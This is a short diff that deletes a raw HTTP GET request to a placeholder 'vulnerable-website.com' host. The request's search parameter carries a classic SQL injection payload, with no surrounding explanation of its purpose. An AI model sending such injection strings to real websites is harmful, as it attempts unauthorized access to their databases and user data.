@@ -1,3 +1,0 @@
-GET /search.php?q=1' OR '1'='1 HTTP/1.1
-Host: vulnerable-website.com
-User-Agent: Mozilla/5.0
